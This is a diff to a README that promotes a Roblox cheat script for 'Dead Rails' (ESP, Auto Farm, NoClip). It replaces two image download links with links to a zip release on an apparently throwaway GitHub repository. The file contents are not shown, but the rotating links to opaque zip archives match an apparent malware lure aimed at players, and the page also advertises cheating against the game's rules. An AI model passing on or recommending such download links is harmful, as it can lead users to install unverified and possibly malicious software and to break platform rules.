@@ -6,11 +6,11 @@
 The Dead Rails Script is a powerful tool designed to enhance gameplay in the Roblox game "Dead Rails" By integrating features like ESP (Extra Sensory Perception), Auto Farm, NoClip, and more, players can navigate the post-apocalyptic railways with greater efficiency and strateg. These scripts are especially beneficial for those aiming to optimize their in-game performance and experienc.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 [![hq720](https://github.com/user-attachments/assets/7b065175-ac46-462d-aff4-71fd4dbc01d1)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 ---
 
